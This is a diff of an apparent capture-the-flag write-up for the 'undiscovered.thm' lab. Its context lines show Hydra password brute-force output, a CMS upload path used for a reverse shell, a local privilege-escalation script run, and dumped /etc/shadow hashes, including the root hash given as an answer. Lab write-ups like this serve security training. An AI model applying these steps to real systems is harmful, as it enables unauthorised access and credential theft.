@@ -216,7 +216,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-20 11:22:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-20 11:22:44
 
-
 http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=media
 
 revshell
@@ -374,7 +373,6 @@ william@kali:~$ ./script
 [i] Start Admin Area!
 [i] Make sure to keep this script safe from anyone else!
 
-
 william@kali:~$ ./script 1
 /bin/cat: /home/leonard/1: No such file or directory
 
@@ -427,10 +425,8 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-
 0 packages can be updated.
 0 updates are security updates.
-
 
 Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
 leonard@undiscovered:~$ ls
@@ -509,10 +505,7 @@ william:$6$Nxvi9UI5$h.yTVQCnXbfZ7BZT1sZnl4NHF074.uYC9o.1t61vSfHTJTdVBrdxib/QKXUl
 leonard:$6$mOYLO55O$oUzIfZpklQj8M4rumAa5UJWoA1KXBYEsQGAdtJliuJDvSAwweQdGi8bgbz.dDVZ63jUc/UX3/VXRwpCkEI5rQ/:18509:0:99999:7:::
 nfsnobody:!:18510:0:99999:7:::
 
-
 ```
-
-![[Pasted image 20230820102834.png]]
 
 user.txt
 
@@ -521,6 +514,5 @@ user.txt
 Whats the root user's password hash?
 
 	*root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0*
-
 
 [[Debug]]
